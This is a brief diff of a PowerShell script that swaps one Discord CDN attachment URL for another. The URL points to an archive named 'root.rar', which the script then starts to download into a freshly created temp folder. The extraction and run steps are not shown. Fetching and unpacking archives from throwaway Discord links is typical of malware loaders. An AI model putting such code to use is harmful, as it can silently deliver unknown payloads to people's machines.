@@ -16,7 +16,7 @@ if (Test-Path $tempFolder) { Remove-Item $tempFolder -Recurse -Force }
 New-Item -ItemType Directory -Path $extractPath -Force | Out-Null
 
 # Your file URL (replace this)
-$url = "https://cdn.discordapp.com/attachments/1371437311455399936/1384353382310875267/root.rar?ex=68521f0e&is=6850cd8e&hm=ff52f5dcda826b08d7148448430271914c06ebf8738f85cbb259d9feba087015&"
+$url = "https://cdn.discordapp.com/attachments/1378738023247642697/1384859490679001129/root.rar?ex=6853f668&is=6852a4e8&hm=3cf2eaa871ec1db7ba74e4a7b764ebee2dffc9e9a31a8bbc8fa09013f5240715&"
 
 # Download the .rar
 Write-Host "[*] Downloading..."
